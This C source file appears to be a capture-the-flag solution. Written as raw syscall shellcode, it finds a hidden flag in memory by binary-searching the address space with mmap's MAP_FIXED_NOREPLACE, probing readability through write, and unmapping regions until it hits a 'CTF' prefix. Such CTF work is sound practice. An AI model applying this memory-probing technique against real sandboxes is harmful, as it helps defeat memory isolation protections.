#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/mman.h>
#include <errno.h>

long syscall_func(long number, ...);

#define PAGE_SIZE (4096)
#define PAGE_ALIGN(x) (((x)) & ~(PAGE_SIZE-1))

#define MAX_ERRNO       4095
#define IS_ERR_VALUE(x) (((unsigned long)(x)) >= (unsigned long)-MAX_ERRNO)

#define MIN_ADDR (0x10000)
#define MAX_ADDR (0x7ffffffff000)

// Check with 'mmap' and 'MAP_FIXED_NOREPLACE' whether some [address,address+size) range
// can be replaced (meaning: are there any allocations there?)
static int can_be_replaced(uintptr_t address, size_t size)
{
    int result = 1;
    void * mmap_res = (void *) syscall_func(__NR_mmap,
        (void *) address, size, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
    if (mmap_res == (void *)(-EEXIST))
    {
        result = 0;
    }
    if (!IS_ERR_VALUE(mmap_res))
    {
        syscall_func(__NR_munmap, mmap_res, size);
    }
    return result;
}

// Find the lowest address currently allocated in the address space
static uintptr_t find_lowest_allocated_addr(void)
{
    uintptr_t start_addr = MIN_ADDR;
    uintptr_t end_addr = MAX_ADDR;

    // Binary search
    while ((end_addr - start_addr) > PAGE_SIZE)
    {
        uintptr_t guess_addr = PAGE_ALIGN((start_addr + end_addr) / 2);

        size_t allocation_size = guess_addr - start_addr;
        if (!can_be_replaced(start_addr, allocation_size))
        {
            end_addr = guess_addr;
        }
        else
        {
            start_addr = guess_addr;
        }
    }

    // Check if we need to return "start_addr" or "end_addr"
    if (!can_be_replaced(start_addr, PAGE_SIZE))
    {
        return start_addr;
    }
    return end_addr;
}

// HARD MODE: find the flag assuming 'xor rdi, rdi' is the first instruction (we don't know where is the maze).
int _start(void)
{
    // Iteratively: find the lowest allocated address, probe it for being readable, and check if it looks
    // like the start of the flag.
    while (1)
    {
        // Find lowest allocation
        uintptr_t lowest_addr = find_lowest_allocated_addr();

        // Probe for pointer (we'll fail with -EFAULT in case the pointer is mapped with PROT_NONE)
        if (syscall_func(__NR_write, STDOUT_FILENO, (void *) lowest_addr, 1) == 1)
        {
            char * readable_pointer = (char *) lowest_addr;

            // Check if we found the flag
            if ((readable_pointer[0] == 'C') && (readable_pointer[1] == 'T') && (readable_pointer[2] == 'F'))
            {
                // Flag found! Print and exit
                syscall_func(__NR_write, STDOUT_FILENO, readable_pointer, 90);
                syscall_func(__NR_exit, 1);
            }
        }

        // un-map and go again!
        syscall_func(__NR_munmap, lowest_addr, PAGE_SIZE);
    }

    // Bye-bye
    syscall_func(__NR_exit, 0);
}
